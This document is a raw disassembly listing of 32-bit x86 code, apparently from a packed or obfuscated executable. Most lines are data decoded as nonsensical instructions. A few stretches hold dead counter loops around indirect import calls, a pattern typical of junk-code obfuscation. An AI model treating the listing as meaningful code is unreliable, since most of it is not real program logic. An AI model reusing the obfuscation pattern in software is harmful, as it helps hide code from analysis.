  40383f:	rol    DWORD PTR [esi-0x5a],1
  403842:	bound  eax,QWORD PTR [edi+0x6c]
  403845:	push   edi
  403846:	es gs clc 
  403849:	or     DWORD PTR [edi],ebp
  40384b:	pushf  
  40384c:	mov    cl,BYTE PTR [ecx+0x7d499fb3]
  403852:	call   0xf9b475fe
  403857:	retf   
  403858:	and    esp,DWORD PTR [edx-0x4afe4984]
  40385e:	pop    edx
  40385f:	mov    esp,0x140d06bb
  403864:	nop
  403865:	pop    edi
  403866:	(bad)  
  403867:	das    
  403868:	push   edx
  403869:	sub    ebp,DWORD PTR [ebp+0x2fe7e1f2]
  40386f:	xchg   esp,eax
  403870:	(bad)  
  403871:	in     al,0x60
  403873:	push   esi
  403874:	(bad)  
  403876:	xor    DWORD PTR [edx-0x43],0x6b4a7167
  40387d:	cld    
  40387e:	in     al,dx
  40387f:	nop    DWORD PTR [ecx+0x2e]
  403883:	xor    al,0x8c
  403885:	sbb    bh,dl
  403887:	ret    
  403888:	les    ebp,FWORD PTR [ebx]
  40388a:	loopne 0x4038ef
  40388c:	mov    WORD PTR [eax],gs
  40388e:	adc    dh,BYTE PTR [ebx]
  403890:	cmc    
  403891:	sbb    edi,DWORD PTR [edx+0x37]
  403894:	and    ebx,DWORD PTR [edi-0x14]
  403897:	ficom  DWORD PTR [eax]
  403899:	push   ss
  40389a:	out    0x26,eax
  40389c:	mov    bl,BYTE PTR ds:0x167c9fd7
  4038a2:	imul   dl
  4038a4:	cmp    DWORD PTR [esi-0x1e],ebx
  4038a7:	inc    edx
  4038a8:	push   es
  4038a9:	dec    edi
  4038aa:	sub    DWORD PTR ds:0x9db3ca1e,eax
  4038b0:	dec    edx
  4038b1:	mov    eax,ds:0x8893b741
  4038b6:	stos   BYTE PTR es:[edi],al
  4038b7:	mov    bl,0x2e
  4038b9:	cmp    DWORD PTR ds:0xa0636ae9,eax
  4038bf:	aaa    
  4038c0:	cwde   
  4038c1:	pop    edi
  4038c2:	add    bl,dl
  4038c4:	lahf   
  4038c5:	cdq    
  4038c6:	jne    0x403889
  4038c8:	lahf   
  4038c9:	ins    DWORD PTR es:[edi],dx
  4038ca:	enter  0xc759,0x1c
  4038ce:	fwait
  4038cf:	scas   eax,DWORD PTR es:[edi]
  4038d0:	push   ebp
  4038d1:	dec    ebx
  4038d2:	mov    esi,0xbe3f60f2
  4038d7:	xchg   esi,eax
  4038d8:	call   0x12c0:0xeadb582
  4038df:	cmp    DWORD PTR [edx],ecx
  4038e1:	xor    eax,0x195f329a
  4038e6:	cmp    BYTE PTR [ebx+0xb],al
  4038e9:	adc    BYTE PTR [eax-0x680f180f],bl
  4038ef:	sti    
  4038f0:	je     0x403899
  4038f2:	dec    edi
  4038f3:	mov    dl,0xf7
  4038f5:	or     eax,0x981ddb20
  4038fa:	mov    al,0x78
  4038fc:	mov    dh,BYTE PTR [eax-0x58783cb2]
  403902:	in     eax,0xaa
  403904:	aad    0x86
  403906:	inc    esi
  403907:	(bad)  
  403908:	mov    esi,0xd018a4e1
  40390d:	jle    0x403926
  40390f:	sub    BYTE PTR [edi],dh
  403911:	inc    ebx
  403912:	out    dx,al
  403913:	hlt    
  403914:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403916:	mov    bh,0xff
  403918:	aas    
  403919:	pop    es
  40391a:	xchg   BYTE PTR [edx],cl
  40391c:	push   edx
  40391d:	ja     0x4038a7
  40391f:	and    al,cl
  403921:	xor    eax,0xbf0cddc4
  403926:	std    
  403927:	lds    ecx,FWORD PTR [eax]
  403929:	mov    eax,0x30a0f291
  40392e:	fmul   DWORD PTR [ecx+eax*2-0x27]
  403932:	xchg   edx,eax
  403933:	inc    ebp
  403934:	adc    BYTE PTR [edi+0xf],0x6e
  403938:	add    BYTE PTR [eax+0x16],bh
  40393b:	push   eax
  40393c:	xchg   edx,eax
  40393d:	cmp    esp,ebx
  40393f:	pop    es
  403940:	mov    ah,0xd
  403942:	push   ebp
  403943:	xchg   esp,eax
  403944:	cli    
  403945:	sub    DWORD PTR [ebp+0xf],esp
  403948:	xchg   DWORD PTR ds:0xaea63be1,ecx
  40394e:	fwait
  40394f:	mov    bl,0x4e
  403951:	push   esp
  403952:	jns    0x40394e
  403954:	mov    edx,edi
  403956:	jle    0x40394f
  403958:	inc    eax
  403959:	or     al,0x8f
  40395b:	and    al,0xfc
  40395d:	mov    ebx,0x8c4e24b1
  403962:	(bad)  
  403963:	mov    gs,WORD PTR [edi+edx*2-0x3e]
  403967:	pop    edi
  403968:	(bad)  
  403969:	in     al,dx
  40396a:	(bad)  
  40396b:	dec    edi
  40396c:	sub    bl,BYTE PTR ss:[edx]
  40396f:	lahf   
  403970:	mov    al,bl
  403972:	lods   al,BYTE PTR ds:[esi]
  403973:	test   BYTE PTR [edx],ah
  403975:	out    dx,eax
  403976:	fwait
  403977:	mov    ?,WORD PTR [esp+eiz*8]
  40397a:	aaa    
  40397b:	sub    al,0xc2
  40397d:	sahf   
  40397e:	test   al,0x60
  403980:	lods   al,BYTE PTR ds:[esi]
  403981:	test   DWORD PTR [ebx],esp
  403983:	or     BYTE PTR [esi+0x47],dh
  403986:	inc    ecx
  403987:	bound  ebp,QWORD PTR [ecx-0x3e]
  40398a:	fs std 
  40398c:	and    eax,0x5a658fb8
  403991:	out    dx,al
  403992:	paddusb mm1,QWORD PTR [edx+0x7096d219]
  403999:	inc    ecx
  40399a:	push   ebp
  40399b:	sti    
  40399c:	mov    WORD PTR [ebp+ebx*4+0x4227ffdd],?
  4039a3:	mov    DWORD PTR [ecx],ebp
  4039a5:	and    eax,0xb6b3d22f
  4039aa:	or     BYTE PTR [ebx+0x4102ce15],ch
  4039b0:	jnp    0x403950
  4039b2:	pop    edx
  4039b3:	mov    eax,edx
  4039b5:	ja     0x403a23
  4039b7:	pusha  
  4039b8:	adc    BYTE PTR [esi-0x7ad2e512],al
  4039be:	pop    ds
  4039bf:	(bad)  
  4039c0:	mov    ecx,0x8e8087ba
  4039c5:	popa   
  4039c6:	sub    DWORD PTR [edx-0x3b104e5f],ecx
  4039cc:	aaa    
  4039cd:	mov    bh,0xd7
  4039cf:	ret    
  4039d0:	inc    esp
  4039d1:	(bad)  
  4039d2:	ds not edi
  4039d5:	sbb    ch,BYTE PTR [edi+0x15583bfc]
  4039db:	sahf   
  4039dc:	sti    
  4039dd:	pop    es
  4039de:	cmp    ax,0xc839
  4039e2:	sbb    esi,DWORD PTR [ebx]
  4039e4:	les    ecx,FWORD PTR [edx+0x1b]
  4039e7:	in     al,0xd5
  4039e9:	and    ecx,DWORD PTR [eax]
  4039eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039ec:	into   
  4039ed:	mov    bh,0x16
  4039ef:	add    eax,0xf1562034
  4039f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039f5:	mov    cl,0xed
  4039f7:	jle    0x4039d0
  4039f9:	sahf   
  4039fa:	dec    esp
  4039fb:	dec    edx
  4039fc:	(bad)  
  4039fd:	lods   eax,DWORD PTR ds:[esi]
  4039fe:	in     al,0xc7
  403a00:	pop    ss
  403a01:	xchg   edi,eax
  403a02:	js     0x403a54
  403a04:	xchg   ebx,eax
  403a05:	xor    ebp,DWORD PTR [edi-0x41]
  403a08:	dec    eax
  403a09:	lea    edx,[edi-0x74330ac6]
  403a0f:	inc    ebp
  403a10:	lock mov ebx,DWORD PTR ds:0x42a3c9
  403a17:	mov    ebx,DWORD PTR [ebx]
  403a19:	or     DWORD PTR ds:0x42a2d5,ebx
  403a1f:	xor    eax,esi
  403a21:	and    DWORD PTR ds:0x42a2bd,0x0
  403a2b:	jmp    0x403a3f
  403a30:	xor    ebx,ebx
  403a32:	or     ebx,DWORD PTR ds:0x42a2bd
  403a38:	inc    ebx
  403a39:	mov    DWORD PTR ds:0x42a2bd,ebx
  403a3f:	cmp    DWORD PTR ds:0x42a2bd,0x1e
  403a46:	jae    0x403a74
  403a4c:	cmp    DWORD PTR ds:0x42a2bd,0x21
  403a53:	jne    0x403a6d
  403a59:	push   DWORD PTR [ebp-0xc]
  403a5c:	push   DWORD PTR [ebp-0x1c]
  403a5f:	push   DWORD PTR [ebp-0xc]
  403a62:	push   0x42a5a5
  403a67:	call   DWORD PTR ds:0x4251d0
  403a6d:	jmp    0x403a30
  403a72:	sub    ebx,ebx
  403a74:	add    eax,edi
  403a76:	or     DWORD PTR ds:0x42a3d5,0x53c
  403a80:	mov    DWORD PTR [ebp-0xc],eax
  403a83:	and    DWORD PTR ds:0x42a315,0x0
  403a8d:	jmp    0x403a9f
  403a92:	mov    ebx,DWORD PTR ds:0x42a315
  403a98:	inc    ebx
  403a99:	mov    DWORD PTR ds:0x42a315,ebx
  403a9f:	cmp    DWORD PTR ds:0x42a315,0x1a
  403aa6:	jae    0x403fef
  403aac:	cmp    DWORD PTR ds:0x42a315,0x29
  403ab3:	jne    0x403ad9
  403ab9:	push   DWORD PTR [ebp-0x20]
  403abc:	push   0x42a3ad
  403ac1:	push   DWORD PTR [ebp-0x10]
  403ac4:	push   0x42a4c6
  403ac9:	push   0x2897
  403ace:	push   0x7575
  403ad3:	call   DWORD PTR ds:0x4251d4
  403ad9:	jmp    0x403a92
  403ade:	add    DWORD PTR ds:0x42a351,edx
  403ae4:	jmp    0x403fef
  403ae9:	iret   
  403aea:	ror    edi,1
  403aec:	aas    
  403aed:	rol    ecx,1
  403aef:	iret   
  403af0:	rcl    DWORD PTR [ebx+0x19],1
  403af3:	and    edx,DWORD PTR cs:[ebp-0x1c]
  403af7:	mov    bl,0xf
  403af9:	call   0x6ab8b31f
  403afe:	jl     0x403b78
  403b00:	js     0x403adc
  403b02:	cli    
  403b03:	popf   
  403b04:	xor    bl,BYTE PTR [ebx]
  403b06:	inc    esi
  403b07:	ins    DWORD PTR es:[edi],dx
  403b08:	mov    cl,ch
  403b0a:	add    edx,esp
  403b0c:	adc    eax,0x98492474
  403b11:	test   BYTE PTR [eax+esi*2+0x8ffd5ec],dh
  403b18:	jbe    0x403b8b
  403b1a:	out    0xd2,eax
  403b1c:	lods   eax,DWORD PTR ds:[esi]
  403b1d:	push   edx
  403b1e:	xor    eax,0x30474404
  403b23:	scas   al,BYTE PTR es:[edi]
  403b24:	cs mov edi,0xdb919653
  403b2a:	mov    eax,ss
  403b2c:	mul    bl
  403b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b2f:	xchg   edi,eax
  403b30:	leave  
  403b31:	pusha  
  403b32:	push   ss
  403b33:	out    dx,eax
  403b34:	test   ah,cl
  403b36:	xor    eax,0x3ce8a06e
  403b3b:	mov    edx,0x26cc8977
  403b40:	ret    
  403b41:	dec    ecx
  403b42:	push   0x3c
  403b44:	in     eax,0xc9
  403b46:	xchg   esi,eax
  403b47:	lods   eax,DWORD PTR ds:[esi]
  403b48:	mov    ds:0x6bab630c,al
  403b4d:	mov    eax,0x90185085
  403b52:	in     al,dx
  403b53:	mov    al,ds:0xb4b8f4cd
  403b58:	inc    ecx
  403b59:	retf   
  403b5a:	std    
  403b5b:	call   0x4c039366
  403b60:	dec    eax
  403b61:	mov    ds:0x64ba3a37,eax
  403b66:	xor    eax,0xfa95699c
  403b6b:	call   0x3540:0xd7a9a9b5
  403b72:	fisttp DWORD PTR [eax-0x705015ba]
  403b78:	jl     0x403b42
  403b7a:	outs   dx,DWORD PTR ds:[esi]
  403b7b:	or     al,BYTE PTR [edx-0x20729f85]
  403b81:	jg     0x403b20
  403b83:	pop    esp
  403b84:	loop   0x403b18
  403b86:	mov    bh,BYTE PTR [ecx-0x42]
  403b89:	mov    DWORD PTR [ebp+edi*2-0x307ba9f7],esp
  403b90:	jp     0x403b82
  403b92:	idiv   BYTE PTR [eax]
  403b94:	int    0xa3
  403b96:	(bad)  
  403b97:	(bad)  
  403b99:	mov    ds:0x344518c1,al
  403b9e:	mul    BYTE PTR [ebp+0x2a79610a]
  403ba4:	mov    ss,edi
  403ba6:	fwait
  403ba7:	push   esi
  403ba8:	(bad)  
  403ba9:	xlat   BYTE PTR ds:[ebx]
  403baa:	fidiv  DWORD PTR [ebp+0x202a6820]
  403bb0:	enter  0x36e6,0xea
  403bb4:	int3   
  403bb5:	lods   al,BYTE PTR ds:[esi]
  403bb6:	mov    esp,0xaeaa5d0c
  403bbb:	inc    esi
  403bbc:	inc    edx
  403bbd:	mov    ecx,0x1f0b52cb
  403bc2:	pop    ebp
  403bc3:	std    
  403bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc5:	sub    bh,BYTE PTR [ebx-0x4d544a5a]
  403bcb:	jb     0x403c1f
  403bcd:	sar    DWORD PTR [edx+0x1817e80f],0xbf
  403bd4:	sbb    al,0x70
  403bd6:	mov    ebx,0xff93ed3d
  403bdb:	xor    al,0x14
  403bdd:	rcr    DWORD PTR [ebp+ebp*4-0x6b],1
  403be1:	test   eax,0x425663a
  403be6:	mov    cl,0x9b
  403be8:	pop    ss
  403be9:	repnz pusha 
  403beb:	mov    al,0x7d
  403bed:	imul   edx,DWORD PTR [ebx],0xdcc4e208
  403bf3:	ins    BYTE PTR es:[edi],dx
  403bf4:	mov    ds:0x325fa4b1,eax
  403bf9:	add    esi,DWORD PTR [esi-0x3bff8dae]
  403bff:	fs cwde 
  403c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c02:	scas   al,BYTE PTR es:[edi]
  403c03:	mov    bh,0x29
  403c05:	cmc    
  403c06:	mov    bh,0x60
  403c08:	cmp    BYTE PTR [ecx+0x5],0x3
  403c0c:	pop    edx
  403c0d:	adc    dl,BYTE PTR [edi+edi*1]
  403c10:	(bad)  
  403c11:	call   0x7b89c010
  403c16:	pop    ebp
  403c17:	imul   ebp,DWORD PTR [eax-0x5c],0x47
  403c1b:	outs   dx,BYTE PTR ds:[esi]
  403c1c:	sub    al,0xcd
  403c1e:	test   eax,0x4465008d
  403c23:	stos   DWORD PTR es:[edi],eax
  403c24:	(bad)  
  403c25:	nop
  403c26:	ds es call 0x4f34:0x690c2e51
  403c2f:	retf   
  403c30:	push   ecx
  403c31:	stos   BYTE PTR es:[edi],al
  403c32:	ds into 
  403c34:	jecxz  0x403c9e
  403c36:	fidivr WORD PTR [eax-0x42]
  403c39:	xor    eax,0x4185bb56
  403c3e:	cmp    edi,DWORD PTR [edi]
  403c40:	ins    DWORD PTR es:[edi],dx
  403c41:	mov    ?,WORD PTR [edi-0x7a]
  403c44:	dec    edx
  403c45:	sub    eax,0x66a043c8
  403c4a:	jb     0x403c3d
  403c4c:	test   DWORD PTR [ebp-0x26],0xec8c85d2
  403c53:	xor    bh,BYTE PTR [esp+esi*1-0x56]
  403c57:	push   cs
  403c58:	sbb    edx,DWORD PTR [ebx-0x60]
  403c5b:	jb     0x403c8a
  403c5d:	fstp   DWORD PTR [eax+ecx*8+0x4a6c508b]
  403c64:	xor    al,0x63
  403c66:	cwde   
  403c67:	xor    DWORD PTR ds:0xc74dd772,0xffffffdf
  403c6e:	or     bl,bl
  403c70:	ret    0x87c9
  403c73:	fisub  WORD PTR [ecx+eiz*4-0x12]
  403c77:	pushf  
  403c78:	jo     0x403c20
  403c7a:	call   0x3856:0xffe944cf
  403c81:	mov    edx,0x12e62176
  403c86:	jmp    0x403c09
  403c88:	mov    eax,0x6e2bbd72
  403c8d:	scas   al,BYTE PTR es:[edi]
  403c8e:	bound  esi,QWORD PTR [eax]
  403c90:	call   0x54c:0x8e483023
  403c97:	div    DWORD PTR [ecx]
  403c99:	scas   al,BYTE PTR es:[edi]
  403c9a:	out    dx,al
  403c9b:	push   esi
  403c9c:	test   edx,0x9ac6c1bd
  403ca2:	mov    DWORD PTR ds:0xa213f764,ebx
  403ca8:	imul   eax,ecx,0x789c7e42
  403cae:	cmp    BYTE PTR [ecx],dh
  403cb0:	or     eax,0x5977a2a6
  403cb5:	jge    0x403c7f
  403cb7:	fcom   st(2)
  403cb9:	jg     0x403c79
  403cbb:	xor    dl,dh
  403cbd:	out    0x40,al
  403cbf:	sbb    dl,BYTE PTR [edi-0x5901ca97]
  403cc5:	aad    0xaf
  403cc7:	inc    esi
  403cc8:	cwde   
  403cc9:	in     al,0x24
  403ccb:	adc    al,0x3d
  403ccd:	jbe    0x403d35
  403ccf:	in     al,0x33
  403cd1:	xor    eax,0x8a908670
  403cd6:	out    dx,eax
  403cd7:	mov    ds:0x849a6feb,al
  403cdc:	test   BYTE PTR [edi-0xb],bl
  403cdf:	inc    edi
  403ce0:	mov    DWORD PTR [esi],ebp
  403ce2:	mov    es,WORD PTR [edx+ebx*4]
  403ce5:	xchg   DWORD PTR [ebx-0x68],ebx
  403ce8:	mov    ch,0xb0
  403cea:	pop    ecx
  403ceb:	cmp    edx,DWORD PTR [ebx+edi*4]
  403cee:	and    eax,0xaeda1fe8
  403cf3:	shl    BYTE PTR [ebx],1
  403cf5:	pop    es
  403cf6:	lds    ecx,FWORD PTR [edi]
  403cf8:	fcomp  st(2)
  403cfa:	repz test DWORD PTR [eax],ebp
  403cfd:	aaa    
  403cfe:	into   
  403cff:	xor    esp,0xfffffff5
  403d02:	nop
  403d03:	lea    eax,[ebx-0x68bf6800]
  403d09:	into   
  403d0a:	repz js 0x403d25
  403d0d:	xchg   ecx,eax
  403d0e:	test   BYTE PTR [eax],0xc2
  403d11:	ret    
  403d12:	arpl   WORD PTR [edx+0x1257d258],sp
  403d18:	push   0x47
  403d1a:	cs mov eax,cs:0xb86154d9
  403d21:	mov    esp,0xa4f0bc7e
  403d26:	in     eax,dx
  403d27:	mov    ss,WORD PTR [edx]
  403d29:	jl     0x403cec
  403d2b:	gs (bad) 
  403d2e:	or     al,0x7a
  403d30:	scas   al,BYTE PTR es:[edi]
  403d31:	test   DWORD PTR [eax],eax
  403d33:	cmp    ch,BYTE PTR [edi-0x4c92831c]
  403d39:	or     dh,cl
  403d3b:	dec    esi
  403d3c:	iret   
  403d3d:	lahf   
  403d3e:	dec    BYTE PTR [edx-0x3e71ec4d]
  403d44:	aas    
  403d45:	jge    0x403da0
  403d47:	sahf   
  403d48:	dec    esi
  403d49:	xchg   edi,eax
  403d4a:	sub    eax,0xfb431391
  403d4f:	mov    ds,eax
  403d51:	std    
  403d52:	jmp    0x5ceea668
  403d57:	mov    al,ds:0xe296467c
  403d5c:	pop    ds
  403d5d:	mov    ebx,0x597f54fb
  403d62:	jae    0x403cf2
  403d64:	pop    ecx
  403d65:	jne    0x403d47
  403d67:	xor    al,0xe2
  403d69:	push   esi
  403d6a:	xchg   edx,eax
  403d6b:	loopne 0x403dcf
  403d6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d6e:	push   cs
  403d6f:	ret    
  403d70:	xchg   esp,eax
  403d71:	mov    al,ds:0x83ebcaaa
  403d76:	mov    ebx,0x19a33a06
  403d7b:	scas   al,BYTE PTR es:[edi]
  403d7c:	add    eax,0x8c120761
  403d81:	mov    al,0x8
  403d83:	dec    ebx
  403d84:	push   ss
  403d85:	ss xchg esp,eax
  403d87:	jne    0x403d80
  403d89:	fsub   st,st(6)
  403d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d8c:	(bad)  
  403d8d:	mov    ecx,0x85f379d6
  403d92:	(bad)  
  403d95:	add    BYTE PTR [eax+0x5c],dl
  403d98:	scas   al,BYTE PTR es:[edi]
  403d99:	repnz int3 
  403d9b:	and    BYTE PTR [esi+0x3a52fb4c],ah
  403da1:	xchg   esi,eax
  403da2:	cmp    BYTE PTR ds:0xed03a401,al
  403da8:	aad    0x7e
  403daa:	xchg   ecx,eax
  403dab:	xor    ah,BYTE PTR [esi+ecx*8+0x5c]
  403daf:	shr    BYTE PTR [edx+ebp*8+0x24],0xfc
  403db4:	adc    BYTE PTR [ebx+0x4a],ch
  403db7:	dec    eax
  403db8:	daa    
  403db9:	(bad)  
  403dba:	(bad)  
  403dbb:	out    dx,eax
  403dbc:	sahf   
  403dbd:	and    ch,BYTE PTR [ebp-0x238fc42e]
  403dc3:	pop    edi
  403dc4:	ret    0x589
  403dc7:	ret    
  403dc8:	icebp  
  403dc9:	cmp    DWORD PTR [edx],eax
  403dcb:	push   cs
  403dcc:	dec    esi
  403dcd:	and    BYTE PTR [edx-0x4bfd0b59],bl
  403dd3:	xchg   esi,eax
  403dd4:	jns    0x403de6
  403dd6:	xchg   ecx,eax
  403dd7:	inc    ebx
  403dd8:	push   0x5f
  403dda:	stc    
  403ddb:	jmp    0xbea8:0x23086ac5
  403de2:	mov    DWORD PTR [edi+0x7b771c6e],esi
  403de8:	bound  edi,QWORD PTR [eax+0x35]
  403deb:	or     edx,DWORD PTR [ecx+0x40]
  403dee:	(bad)  
  403def:	dec    edi
  403df0:	int3   
  403df1:	lock pop ds
  403df3:	sub    edi,ebx
  403df5:	or     eax,0xae4a4d37
  403dfa:	aas    
  403dfb:	popa   
  403dfc:	cmp    al,0x7
  403dfe:	adc    eax,0x4d27223c
  403e03:	fisubr DWORD PTR [edx+0x44]
  403e06:	cdq    
  403e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e08:	mov    esp,0x66f523f9
  403e0d:	cld    
  403e0e:	shl    BYTE PTR [ebx+0x6e123137],0xaf
  403e15:	push   esp
  403e16:	sahf   
  403e17:	and    al,0x44
  403e19:	retf   
  403e1a:	inc    ecx
  403e1b:	pop    ss
  403e1c:	pop    esi
  403e1d:	leave  
  403e1e:	and    al,0xaf
  403e20:	jmp    0x60e8:0x91c5d19a
  403e27:	popa   
  403e28:	test   al,0xc6
  403e2a:	pop    ss
  403e2b:	dec    esi
  403e2c:	pop    ebx
  403e2d:	xor    BYTE PTR [edi+eax*1-0x5a],0x68
  403e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e33:	adc    ebx,edx
  403e35:	xor    BYTE PTR [ebx-0x25],cl
  403e38:	xchg   DWORD PTR [eax-0x74ac2c5c],eax
  403e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3f:	call   0x80d9:0x94217e28
  403e46:	push   es
  403e47:	nop
  403e48:	dec    edi
  403e49:	or     bh,BYTE PTR [edi+0x2695d990]
  403e4f:	js     0x403e9d
  403e51:	jl     0x403e63
  403e53:	mov    ebx,0xc5937ade
  403e58:	push   esi
  403e59:	jnp    0x403ecc
  403e5b:	jle    0x403ed9
  403e5d:	rcr    BYTE PTR [ebp-0x7cb22ff0],1
  403e63:	inc    edi
  403e64:	dec    ebp
  403e65:	mov    dl,BYTE PTR [ecx+0x6194bb24]
  403e6b:	xchg   edx,eax
  403e6c:	cmp    bh,BYTE PTR [ebx-0x28]
  403e6f:	or     DWORD PTR [eax+0x1f],esi
  403e72:	cmp    al,0xa8
  403e74:	mov    esi,0xe73bebbe
  403e79:	faddp  st(3),st
  403e7b:	push   0x8a128bd7
  403e80:	xlat   BYTE PTR ds:[ebx]
  403e81:	jae    0x403e56
  403e83:	rcl    BYTE PTR [edi+0x50],1
  403e86:	cmp    al,BYTE PTR [edi+0x41]
  403e89:	mov    ah,0x3d
  403e8b:	mov    ds:0xaf385662,al
  403e90:	int3   
  403e91:	cmp    al,0x23
  403e93:	pushf  
  403e94:	in     al,0x54
  403e96:	inc    edi
  403e97:	mov    ch,0xc8
  403e99:	or     DWORD PTR [ecx+0x77f63190],edi
  403e9f:	jmp    0x403e71
  403ea1:	stc    
  403ea2:	adc    BYTE PTR cs:[ecx],bh
  403ea5:	sbb    DWORD PTR [ecx-0x255a725f],0x261b8b4e
  403eaf:	sub    DWORD PTR [ebx],esi
  403eb1:	inc    ecx
  403eb2:	fs mov al,ah
  403eb5:	mov    cl,0xd8
  403eb7:	xchg   ebx,eax
  403eb8:	push   ecx
  403eb9:	xor    eax,0xbe95e1ad
  403ebe:	cmp    al,0xf6
  403ec0:	and    eax,0x1e536d20
  403ec5:	sbb    DWORD PTR [ebx-0x6a],ebp
  403ec8:	lahf   
  403ec9:	xchg   edx,eax
  403eca:	push   ds
  403ecb:	and    DWORD PTR [ecx],eax
  403ecd:	push   es
  403ece:	stos   BYTE PTR es:[di],al
  403ed0:	test   eax,0xb8d41f54
  403ed5:	mov    esi,0x899730cb
  403eda:	(bad)  
  403edc:	bound  eax,QWORD PTR [eax+0x6444d26b]
  403ee2:	retf   
  403ee3:	clc    
  403ee4:	cmp    DWORD PTR [esi],0xd1abe6c1
  403eea:	mov    edi,0x51d709c
  403eef:	(bad)  
  403ef0:	cmc    
  403ef1:	xlat   BYTE PTR ds:[ebx]
  403ef2:	je     0x403f5a
  403ef4:	xchg   BYTE PTR [edi-0x65],ah
  403ef7:	ins    DWORD PTR es:[edi],dx
  403ef8:	pop    esi
  403ef9:	jmp    0x403f0d
  403efb:	js     0x403e82
  403efd:	xchg   edi,eax
  403efe:	in     eax,dx
  403eff:	shr    DWORD PTR [esi],0x59
  403f02:	pop    esi
  403f03:	sub    ch,BYTE PTR [edi-0x14]
  403f06:	out    0xe0,eax
  403f08:	cmp    esp,DWORD PTR [esi]
  403f0a:	bound  ebx,QWORD PTR [esi+esi*8+0x481896a5]
  403f11:	pop    ebp
  403f12:	xchg   edx,eax
  403f13:	scas   al,BYTE PTR es:[edi]
  403f14:	xchg   BYTE PTR [ebp+edx*8-0x49091820],ah
  403f1b:	pop    ebp
  403f1c:	mov    ebx,0x36db8b86
  403f21:	inc    ecx
  403f22:	gs test esp,ebp
  403f25:	mov    ch,0x13
  403f27:	xor    dl,BYTE PTR [edi+ebp*2+0x78]
  403f2b:	outs   dx,DWORD PTR ds:[esi]
  403f2d:	cmp    ah,BYTE PTR [eax]
  403f2f:	(bad)  
  403f30:	imul   ebx,DWORD PTR [esi-0x29],0x3f53262c
  403f37:	sub    eax,0x80070cc3
  403f3c:	xchg   ecx,eax
  403f3d:	pop    edx
  403f3e:	fwait
  403f3f:	std    
  403f40:	dec    edx
  403f41:	pop    ebx
  403f42:	fiadd  DWORD PTR [edi-0x1e8368c1]
  403f48:	out    0x32,al
  403f4a:	or     eax,DWORD PTR [edi]
  403f4c:	loopne 0x403f0a
  403f4e:	lods   al,BYTE PTR ds:[esi]
  403f4f:	xchg   edi,eax
  403f50:	ja     0x403ed5
  403f52:	rcl    ebp,1
  403f54:	push   0x83a4bf57
  403f59:	inc    ecx
  403f5a:	mov    WORD PTR [ebx+0x6e],ds
  403f5d:	sub    eax,edi
  403f5f:	adc    eax,0x9b4ed27c
  403f64:	add    al,0xc9
  403f66:	fisubr WORD PTR [ecx+0x3a91b110]
  403f6c:	or     al,0xbb
  403f6e:	add    BYTE PTR [ebp-0x6e],bl
  403f71:	jg     0x403f97
  403f73:	push   es
  403f74:	(bad)  
  403f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f76:	adc    ebx,ecx
  403f78:	add    esp,DWORD PTR [ecx]
  403f7a:	mov    al,ds:0x4652ca3c
  403f7f:	pop    ds
  403f80:	mov    ds:0x1c628ab9,eax
  403f85:	cli    
  403f86:	xor    al,BYTE PTR [esp+eiz*8]
  403f89:	fwait
  403f8a:	jp     0x403f6c
  403f8c:	daa    
  403f8d:	lods   eax,DWORD PTR ds:[esi]
  403f8e:	nop
  403f8f:	(bad)  
  403f90:	xlat   BYTE PTR ds:[ebx]
  403f91:	neg    eax
  403f93:	cmc    
  403f94:	(bad)  
  403f95:	cmp    ecx,DWORD PTR [ebp+0x34]
  403f98:	int3   
  403f99:	pop    es
  403f9a:	push   ds
  403f9b:	xor    eax,ebx
  403f9d:	nop
  403f9e:	xchg   esi,eax
  403f9f:	xchg   ecx,eax
  403fa0:	mov    edi,0xd1674dfb
  403fa5:	(bad)  
  403fa6:	lock iret 
  403fa8:	test   al,0x9a
  403faa:	dec    ecx
  403fab:	je     0x403ff1
  403fad:	push   esi
  403fae:	retf   
  403faf:	dec    ebx
  403fb0:	sbb    al,dh
  403fb2:	mov    dh,0xfd
  403fb4:	stos   BYTE PTR es:[edi],al
  403fb5:	sub    ebx,DWORD PTR [edi]
  403fb7:	not    BYTE PTR [edx-0x11]
  403fba:	inc    edx
  403fbb:	in     eax,0x8a
  403fbd:	inc    esp
  403fbe:	adc    eax,0x610d6e8d
  403fc3:	clc    
  403fc4:	xchg   ebx,eax
  403fc5:	(bad)  
  403fc6:	dec    edx
  403fc7:	push   cs
  403fc8:	loop   0x403ff1
  403fca:	xchg   edx,eax
  403fcb:	cmp    bl,BYTE PTR [edi+0x63]
  403fce:	neg    ah
  403fd0:	fiadd  WORD PTR ds:0x1d9e3f06
  403fd6:	mov    ds:0x7ce09b6e,al
  403fdb:	(bad)  
  403fdc:	pop    esp
  403fdd:	cli    
  403fde:	mov    dl,0x31
  403fe0:	ror    DWORD PTR ss:[edx-0x24ec30a4],cl
  403fe7:	mov    edi,0x673dc992
  403fec:	adc    BYTE PTR [edx-0x4c],0x8b
  403ff0:	inc    ebp
  403ff1:	les    edx,FWORD PTR [ecx]
  403ff3:	or     eax,0x42a35d
  403ff8:	xor    eax,esi
  403ffa:	mov    ecx,DWORD PTR ds:0x42a33d
  404000:	mov    ebx,DWORD PTR ds:0x42a3f9
  404006:	sub    ecx,ebx
  404008:	or     ecx,DWORD PTR [ecx+ebx*1]
  40400b:	jmp    0x404516
  404010:	xlat   BYTE PTR ds:[ebx]
  404011:	ror    cl,1
  404013:	aas    
  404014:	leave  
  404015:	rcr    ecx,1
  404017:	rol    BYTE PTR [ecx],1
  404019:	xchg   DWORD PTR ds:0x6928b03e,edi
  40401f:	daa    
  404020:	fisub  DWORD PTR [eax+edi*2]
  404023:	js     0x40408f
  404025:	jl     0x40409f
  404027:	js     0x404079
  404029:	add    eax,DWORD PTR [eax+ecx*2+0x12]
  40402d:	stos   DWORD PTR es:[edi],eax
